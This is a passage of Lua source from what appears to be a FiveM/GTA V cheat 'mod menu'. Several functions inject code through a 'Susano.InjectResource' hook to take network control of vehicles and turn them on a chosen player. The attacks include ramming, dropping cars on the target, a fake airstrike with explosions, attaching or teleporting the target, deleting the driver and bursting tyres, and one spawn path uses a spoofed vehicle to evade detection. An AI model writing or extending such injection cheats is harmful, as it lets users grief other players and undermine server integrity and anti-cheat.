                    end
                end
                
                local targetCoords = GetEntityCoords(targetPed)
                local positions = {
                    {x = targetCoords.x + 1.2, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 90.0},
                    {x = targetCoords.x - 1.2, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = -90.0},
                    {x = targetCoords.x, y = targetCoords.y + 1.2, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                    {x = targetCoords.x, y = targetCoords.y - 1.2, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 180.0},
                }
                
                for i = 1, 4 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = positions[i]
                        SetEntityCoordsNoOffset(selectedVehicles[i], pos.x, pos.y, pos.z, false, false, false)
                        SetEntityRotation(selectedVehicles[i], pos.rotX, pos.rotY, pos.rotZ, 2, true)
                        FreezeEntityPosition(selectedVehicles[i], true)
                    end
                end
            end)
        ]], targetServerId))
    end
end

                    function Menu.ActionRamPlayer()
                        if not Menu.SelectedPlayer then return end
                        
                        local targetServerId = Menu.SelectedPlayer
                        
                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d
                                
                                local function ramPlayer(ped)
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    local playerPed = PlayerPedId()
                                    local myCoords = GetEntityCoords(playerPed)
                                    
                                    -- Trouver le vÃ©hicule le plus proche
                                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                                    if not closestVeh or closestVeh == 0 then return end
                                    
                                    -- Sauvegarder ma position actuelle
                                    local savedCoords = GetEntityCoords(playerPed)
                                    local savedHeading = GetEntityHeading(playerPed)
                                    
                                    -- Obtenir le contrÃ´le du vÃ©hicule
                                    SetEntityAsMissionEntity(closestVeh, true, true)
                                    local timeout = 1000
                                    NetworkRequestControlOfEntity(closestVeh)
                                    while not NetworkHasControlOfEntity(closestVeh) and timeout > 0 do
                                        Wait(10)
                                        timeout = timeout - 10
                                        NetworkRequestControlOfEntity(closestVeh)
                                    end
                                    
                                    -- Me tÃ©lÃ©porter dans le vÃ©hicule
                                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                                    Wait(100)
                                    
                                    -- Me remettre Ã  ma position originale
                                    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
                                    SetEntityHeading(playerPed, savedHeading)
                                    Wait(50)
                                    
                                    -- Positionner le vÃ©hicule derriÃ¨re le joueur cible (comme dans Luxor)
                                    local targetCoords = GetEntityCoords(ped)
                                    local spawnPos = GetOffsetFromEntityInWorldCoords(ped, 0.0, -10.0, 0.0)
                                    local heading = GetEntityHeading(ped)
                                    
                                    SetEntityCoordsNoOffset(closestVeh, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                    SetEntityHeading(closestVeh, heading)
                                    
                                    -- Configurer le vÃ©hicule pour le ram
                                    SetVehicleForwardSpeed(closestVeh, 100.0)
                                    SetEntityVisible(closestVeh, true, false)
                                    SetVehicleDoorsLocked(closestVeh, 4)
                                    SetVehicleEngineOn(closestVeh, true, true, false)
                                    
                                    -- Nettoyage automatique aprÃ¨s 15 secondes
                                    Citizen.SetTimeout(15000, function()
                                        if DoesEntityExist(closestVeh) then
                                            DeleteVehicle(closestVeh)
                                        end
                                    end)
                                end
                                
                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                
                                if not targetPlayerId then return end
                                
                                local ped = GetPlayerPed(targetPlayerId)
                                if ped and ped ~= 0 then
                                    ramPlayer(ped)
                                end
                            ]], targetServerId))
                        end
                    end

function Menu.ActionRainVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end
            
            CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                
                local nearbyVehicles = {}
                local vehHandle, veh = FindFirstVehicle()
                local success
                
                repeat
                    if DoesEntityExist(veh) then
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        if distance <= 200.0 and distance > 5.0 and veh ~= GetVehiclePedIsIn(playerPed, false) then
                            table.insert(nearbyVehicles, veh)
                        end
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                
                EndFindVehicle(vehHandle)
                
                if #nearbyVehicles == 0 then return end
                
                for i, veh in ipairs(nearbyVehicles) do
                    if DoesEntityExist(veh) then
                        SetPedIntoVehicle(playerPed, veh, -1)
                        Wait(50)
                        SetEntityAsMissionEntity(veh, true, true)
                        if NetworkGetEntityIsNetworked(veh) then
                            NetworkRequestControlOfEntity(veh)
                        end
                        local targetCoords = GetEntityCoords(targetPed)
                        SetEntityCoordsNoOffset(veh, targetCoords.x, targetCoords.y, targetCoords.z + 50.0, false, false, false)
                        SetEntityHasGravity(veh, true)
                        Wait(10)
                    end
                end
            end)
        ]], targetServerId))
    end
end

function Menu.ActionDropVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end
            
            CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)
                
                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                if not closestVeh or closestVeh == 0 then return end
                
                SetPedIntoVehicle(playerPed, closestVeh, -1)
                Wait(150)
                
                SetEntityAsMissionEntity(closestVeh, true, true)
                if NetworkGetEntityIsNetworked(closestVeh) then
                    NetworkRequestControlOfEntity(closestVeh)
                end
                
                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                Wait(100)
                
                local targetCoords = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(closestVeh, targetCoords.x, targetCoords.y, targetCoords.z + 15.0, false, false, false)
                SetEntityRotation(closestVeh, 0.0, -90.0, 0.0, 2, true)
                SetEntityVelocity(closestVeh, 0.0, 0.0, -100.0)
            end)
        ]], targetServerId))
    end
end

-- Airstrike : Volatus en feu sur la cible
-- Cooldown global pour éviter le spam InjectResource
_G._airstrikeLastUse = 0
_G._airstrikeCD = 5000 -- 5s entre chaque

function Menu.ActionAirstrike()
    if not Menu.SelectedPlayer then return end

    -- Cooldown check (côté overlay)
    local now = GetGameTimer()
    if now - (_G._airstrikeLastUse or 0) < _G._airstrikeCD then return end
    _G._airstrikeLastUse = now

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            CreateThread(function()
                local targetServerId = %d

                -- Resolve target
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end

                -- Kill any previous airstrike thread
                rawset(_G, '_airstrike_active', false)
                Wait(100)
                rawset(_G, '_airstrike_active', true)

                -- Load model
                local modelHash = GetHashKey("volatus")
                RequestModel(modelHash)
                local t = 100
                while not HasModelLoaded(modelHash) and t > 0 do Wait(10); t = t - 1 end
                if not HasModelLoaded(modelHash) then return end

                local tc = GetEntityCoords(targetPed)
                local spawnX = tc.x + math.random(-3, 3) + 0.0
                local spawnY = tc.y + math.random(-3, 3) + 0.0
                local spawnZ = tc.z + 65.0

                -- Spawn via Susano si dispo, sinon fallback CreateVehicle
                local susano = rawget(_G, "Susano")
                local heli = nil
                if susano and type(susano.CreateSpoofedVehicle) == "function" then
                    heli = susano.CreateSpoofedVehicle(modelHash, spawnX, spawnY, spawnZ, math.random(0, 360) + 0.0, false, false, false)
                else
                    heli = CreateVehicle(modelHash, spawnX, spawnY, spawnZ, math.random(0, 360) + 0.0, false, false)
                end

                SetModelAsNoLongerNeeded(modelHash)
                if not heli or heli == 0 then return end

                -- Stocker le handle pour cleanup
                rawset(_G, '_airstrike_heli', heli)

                SetEntityAsMissionEntity(heli, true, true)
                SetEntityRotation(heli, -70.0, 0.0, math.random(0, 360) + 0.0, 2, true)

                -- NE PAS tuer le véhicule immédiatement
                -- On dégrade progressivement pour que RAGE ne le GC pas
                SetVehicleEngineHealth(heli, 100.0)
                SetVehicleBodyHealth(heli, 200.0)
                -- Vélocité de chute
                SetEntityVelocity(heli, 0.0, 0.0, -35.0)

                -- Thread fumée/feu progressif pendant la chute
                CreateThread(function()
                    Wait(300)
                    if DoesEntityExist(heli) then
                        SetVehicleEngineHealth(heli, -1000.0)
                    end
                    Wait(500)
                    if DoesEntityExist(heli) then
                        SetVehicleEngineHealth(heli, -4000.0)
                        SetVehicleBodyHealth(heli, 0.0)
                    end
                end)

                -- Thread principal : tracking altitude → explosion
                local exploded = false
                local timeout = 100 -- 5s max (100 × 50ms)
                while timeout > 0 and not exploded and rawget(_G, '_airstrike_active') do
                    Wait(50)
                    timeout = timeout - 1

                    if not DoesEntityExist(heli) then break end

                    local heliCoords = GetEntityCoords(heli)
                    -- Maintenir la vélocité de chute (RAGE ralentit les épaves)
                    SetEntityVelocity(heli, 0.0, 0.0, -35.0)

                    -- Quand l'heli est à ~12m de la cible
                    if heliCoords.z <= tc.z + 12.0 then
                        -- Impact principal
                        AddExplosion(heliCoords.x, heliCoords.y, heliCoords.z, 7, 5.0, true, false, 1.0)
                        Wait(50)
                        -- Secondaires décalées
                        for i = 1, 3 do
                            local ox = math.random(-3, 3) + 0.0
                            local oy = math.random(-3, 3) + 0.0
                            AddExplosion(heliCoords.x + ox, heliCoords.y + oy, heliCoords.z, 2, 3.0, true, false, 0.8)
                            Wait(80)
                        end
                        -- Napalm sur coords live de la cible
                        Wait(150)
                        if DoesEntityExist(targetPed) then
                            local tc2 = GetEntityCoords(targetPed)
                            for i = 1, 3 do
                                AddExplosion(tc2.x + math.random(-2, 2), tc2.y + math.random(-2, 2), tc2.z, 5, 2.0, true, false, 0.6)
                                Wait(100)
                            end
                        end
                        exploded = true
                    end
                end

                -- Timeout sans impact → forcer explosion
                if not exploded and DoesEntityExist(heli) then
                    local ec = GetEntityCoords(heli)
                    AddExplosion(ec.x, ec.y, ec.z, 7, 5.0, true, false, 1.0)
                end

                -- Cleanup entité après un délai (laisser le temps au FX)
                Wait(2000)
                if DoesEntityExist(heli) then
                    SetEntityAsMissionEntity(heli, true, true)
                    DeleteEntity(heli)
                end
                rawset(_G, '_airstrike_heli', nil)
                rawset(_G, '_airstrike_active', false)
            end)
        ]], targetServerId))
    end
end

                    Menu.CrushMode = "Rain"

                    function Menu.ActionCrush()
                        local crushMode = Menu.CrushMode or "Rain"
                        if crushMode == "Rain" then
                            Menu.ActionRainVehicle()
                        elseif crushMode == "Drop" then
                            Menu.ActionDropVehicle()
                        elseif crushMode == "Ram" then
                            Menu.ActionRamPlayer()
                        end
                    end

                    function Menu.ActionBugAttach()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d

                                local function reqCtrl(entity)
                                    if not entity or entity == 0 then return false end
                                    if not NetworkGetEntityIsNetworked(entity) then
                                        NetworkRegisterEntityAsNetworked(entity)
                                    end
                                    if NetworkGetEntityIsNetworked(entity) then
                                        NetworkRequestControlOfEntity(entity)
                                        local attempts = 0
                                        while not NetworkHasControlOfEntity(entity) and attempts < 50 do
                                            Wait(0)
                                            attempts = attempts + 1
                                            NetworkRequestControlOfEntity(entity)
                                        end
                                        return NetworkHasControlOfEntity(entity)
                                    end
                                    return false
                                end

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                if not targetPlayerId then return end

                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end

                                local playerPed = PlayerPedId()
                                local myCoords = GetEntityCoords(playerPed)
                                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                                if not closestVeh or closestVeh == 0 then return end

                                SetEntityAsMissionEntity(closestVeh, true, true)
                                reqCtrl(closestVeh)

                                SetPedIntoVehicle(playerPed, closestVeh, -1)
                                Wait(120)

                                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)

                                local targetVeh = GetVehiclePedIsIn(targetPed, false)
                                if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetVeh,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                else
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetPed,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                end
                            ]], targetServerId))
                    end
                end

if not attachedPlayers then attachedPlayers = {} end

CreateThread(function()
    while true do
        Wait(0)
        if attachedPlayers and next(attachedPlayers) then
            local me = PlayerPedId()
            if DoesEntityExist(me) then
                local coords = GetEntityCoords(me)
                local f = GetEntityForwardVector(me)
                for playerId, ped in pairs(attachedPlayers) do
                    if DoesEntityExist(ped) then
                        local success = pcall(function()
                            SetEntityCoordsNoOffset(ped, coords.x + f.x, coords.y + f.y, coords.z + f.z, true, true, true)
                            SetEntityHeading(ped, GetEntityHeading(me))
                        end)
                        if not success then
                            attachedPlayers[playerId] = nil
                        end
                    else
                        attachedPlayers[playerId] = nil
                    end
                end
            end
        end
    end
end)

                    function Menu.ActionTPToMe()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d

                                local function reqCtrl(entity)
                                    if not entity or entity == 0 then return false end
                                    if not NetworkGetEntityIsNetworked(entity) then
                                        NetworkRegisterEntityAsNetworked(entity)
                                    end
                                    if NetworkGetEntityIsNetworked(entity) then
                                        NetworkRequestControlOfEntity(entity)
                                        local attempts = 0
                                        while not NetworkHasControlOfEntity(entity) and attempts < 50 do
                                            Wait(0)
                                            attempts = attempts + 1
                                            NetworkRequestControlOfEntity(entity)
                                        end
                                        return NetworkHasControlOfEntity(entity)
                                    end
                                    return false
                                end

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                if not targetPlayerId then return end

                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end

                                local playerPed = PlayerPedId()
                                local myCoords = GetEntityCoords(playerPed)
                                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                                if not closestVeh or closestVeh == 0 then return end

                                SetEntityAsMissionEntity(closestVeh, true, true)
                                reqCtrl(closestVeh)

                                SetPedIntoVehicle(playerPed, closestVeh, -1)
                                Wait(120)

                                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)

                                local targetVeh = GetVehiclePedIsIn(targetPed, false)
                                if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetVeh,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                    Wait(200)
                                    DetachEntity(closestVeh, true, true)
                                    SetEntityCoordsNoOffset(closestVeh, myCoords.x, myCoords.y, myCoords.z + 1.0, false, false, false)
                                    Wait(100)
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetVeh,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                else
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetPed,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                    Wait(200)
                                    DetachEntity(closestVeh, true, true)
                                    SetEntityCoordsNoOffset(closestVeh, myCoords.x, myCoords.y, myCoords.z + 1.0, false, false, false)
                                    Wait(100)
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetPed,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                end
                            ]], targetServerId))
                        end
                    end

Actions.attachPlayerItem = FindItem("Online", "Troll", "Attach Player")
if Actions.attachPlayerItem then
    Actions.attachPlayerItem.onClick = function(value)
        Menu.attachPlayerEnabled = value
        if not Menu.SelectedPlayer then
            Menu.attachPlayerEnabled = false
            return
        end

        local targetServerId = Menu.SelectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                local targetServerId = %d
                local enabled = %s

                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end

                local playerPed = PlayerPedId()

                if enabled then
                    CreateThread(function()
                        rawset(_G, 'attach_loop_' .. targetServerId, true)

                        while rawget(_G, 'attach_loop_' .. targetServerId) do
                            Wait(0)

                            if not DoesEntityExist(targetPed) then break end

                            local myCoords = GetEntityCoords(playerPed)
                            local myForward = GetEntityForwardVector(playerPed)
                            local myHeading = GetEntityHeading(playerPed)

                            SetEntityCoordsNoOffset(targetPed, myCoords.x + myForward.x, myCoords.y + myForward.y, myCoords.z + myForward.z, true, true, true)
                            SetEntityHeading(targetPed, myHeading)
                        end
                    end)
                else
                    rawset(_G, 'attach_loop_' .. targetServerId, false)
                end
            ]], targetServerId, tostring(value)))
        end
                        end
                    end

Menu.BugVehicleMode = "V1"
Menu.KickVehicleMode = "V1"

function Menu.ActionBugVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local bugVehicleMode = Menu.BugVehicleMode or "V1"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local bugVehicleMode = "%s"
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
                return
            end
            
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then return end
            
            if bugVehicleMode == "V2" then
                CreateThread(function()
                    local function reqCtrl(entity)
                        if not entity or entity == 0 then return false end
                        if not NetworkGetEntityIsNetworked(entity) then
                            NetworkRegisterEntityAsNetworked(entity)
                        end
                        if NetworkGetEntityIsNetworked(entity) then
                            NetworkRequestControlOfEntity(entity)
                            local attempts = 0
                            while not NetworkHasControlOfEntity(entity) and attempts < 30 do
                                Wait(10)
                                attempts = attempts + 1
                                NetworkRequestControlOfEntity(entity)
                            end
                            return NetworkHasControlOfEntity(entity)
                        end
                        return false
                    end

                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if not reqCtrl(closestVeh) then return end

                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(120)

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(50)
                    
                    AttachEntityToEntityPhysically(
                        closestVeh, targetVehicle,
                        0, 0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                    )
                    
                    Wait(100)
                    
                    AttachEntityToEntityPhysically(
                        closestVeh, targetVehicle,
                        0, 0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                    )
                end)
            else
                CreateThread(function()
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    
                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end
                    
                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(150)
                    
                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if NetworkGetEntityIsNetworked(closestVeh) then
                        NetworkRequestControlOfEntity(closestVeh)
                    end
                    
                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(100)
                    
                    for i = 1, 30 do
                        DetachEntity(closestVeh, true, true)
                        Wait(5)
                        AttachEntityToEntityPhysically(closestVeh, targetVehicle, 0, 0, 0, 2000.0, 1460.0, 1000.0, 10.0, 88.0, 600.0, true, true, true, false, 0)
                        Wait(5)
                    end
                end)
            end
        ]], targetServerId, bugVehicleMode))
    end
end

function Menu.ActionKickVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local kickMode = Menu.KickVehicleMode or "V1"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local kickMode = "%s"
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
                return
            end
            
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then return end
            
            CreateThread(function()
                local player = PlayerPedId()
                
                if DoesEntityExist(targetVehicle) then
                    local driver = GetPedInVehicleSeat(targetVehicle, -1)
                    if driver ~= 0 and DoesEntityExist(driver) then
                        SetPedIntoVehicle(player, targetVehicle, 0)
                        Wait(10)
                        NetworkRequestControlOfEntity(targetVehicle)
                        DeletePed(driver)
                        SetPedIntoVehicle(player, targetVehicle, -1)
                        Wait(25)
                        TaskLeaveVehicle(player, targetVehicle, 16)
                        Wait(450)
                    end
                end
            end)
        ]], targetServerId, kickMode))
    end
end

function Menu.ActionRemoveAllTires()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
                return
            end

            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then return end

            CreateThread(function()
                local player = PlayerPedId()
                local playerCoords = GetEntityCoords(player)
                local playerHeading = GetEntityHeading(player)

                if DoesEntityExist(targetVehicle) then
                    local driver = GetPedInVehicleSeat(targetVehicle, -1)
                    if driver ~= 0 and DoesEntityExist(driver) then
                        SetPedIntoVehicle(player, targetVehicle, 0)
                        Wait(10)
                        NetworkRequestControlOfEntity(targetVehicle)
                        DeletePed(driver)
                        SetPedIntoVehicle(player, targetVehicle, -1)
                        Wait(25)
                        TaskLeaveVehicle(player, targetVehicle, 16)
                        Wait(450)
                    end

                    NetworkRequestControlOfEntity(targetVehicle)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(targetVehicle) and timeout < 50 do
                        NetworkRequestControlOfEntity(targetVehicle)
                        Wait(10)
                        timeout = timeout + 1
                    end

                    if NetworkHasControlOfEntity(targetVehicle) then
                        for wheel = 0, 3 do
                            SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                            SetVehicleWheelHealth(targetVehicle, wheel, -1000.0)
                            SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                        end
                        SetVehicleWheelType(targetVehicle, 7)
                        Wait(50)
                        for wheel = 0, 3 do
                            SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                            SetVehicleWheelHealth(targetVehicle, wheel, -1000.0)
                        end
                    end
                end

                SetEntityCoordsNoOffset(player, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                SetEntityHeading(player, playerHeading)
                Wait(50)
                SetEntityCoordsNoOffset(player, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                SetEntityHeading(player, playerHeading)
            end)
        ]], targetServerId))
    end
end

function Menu.ActionGiveVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    local targetServerId = %d
    
    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end
    
    if not targetPlayerId then
        return
    end
    
    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        return
    end
    
    local playerPed = PlayerPedId()
    local myCoords = GetEntityCoords(playerPed)
    local myHeading = GetEntityHeading(playerPed)
    
    local giveCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    SetCamCoord(giveCam, camCoords.x, camCoords.y, camCoords.z)
    SetCamRot(giveCam, camRot.x, camRot.y, camRot.z, 2)
    SetCamFov(giveCam, GetGameplayCamFov())
    SetCamActive(giveCam, true)
    RenderScriptCams(true, false, 0, true, true)
    
    local playerModel = GetEntityModel(playerPed)
    RequestModel(playerModel)
    local timeout = 0
    while not HasModelLoaded(playerModel) and timeout < 50 do
        Wait(50)
        timeout = timeout + 1
    end
    
    local groundZ = myCoords.z
    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        groundZ = hitCoords.z
    end
    
    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
    SetEntityCollision(clonePed, false, false)
    FreezeEntityPosition(clonePed, true)
    SetEntityInvincible(clonePed, true)
    SetBlockingOfNonTemporaryEvents(clonePed, true)
    SetPedCanRagdoll(clonePed, false)
    ClonePedToTarget(playerPed, clonePed)
    
    SetEntityVisible(playerPed, false, false)
    SetEntityLocallyInvisible(playerPed)
    
    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
    
    if not closestVeh or closestVeh == 0 then
        SetEntityVisible(playerPed, true, false)
        SetCamActive(giveCam, false)
        if not rawget(_G, 'isSpectating') then
            RenderScriptCams(false, false, 0, true, true)
        end
        DestroyCam(giveCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
        return
    end
    
    SetPedIntoVehicle(playerPed, closestVeh, -1)
    Wait(150)
    SetEntityAsMissionEntity(closestVeh, true, true)
    if NetworkGetEntityIsNetworked(closestVeh) then
        NetworkRequestControlOfEntity(closestVeh)
        local timeout = 0
        while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
            NetworkRequestControlOfEntity(closestVeh)
            Wait(10)
            timeout = timeout + 1
        end
    end
    
    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
    SetEntityHeading(playerPed, myHeading)
    Wait(100)
    
    if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
        SetEntityVisible(playerPed, true, false)
        SetCamActive(giveCam, false)
        if not rawget(_G, 'isSpectating') then
            RenderScriptCams(false, false, 0, true, true)
        end
        DestroyCam(giveCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
        return
    end
    
    local targetCoords = GetEntityCoords(targetPed)
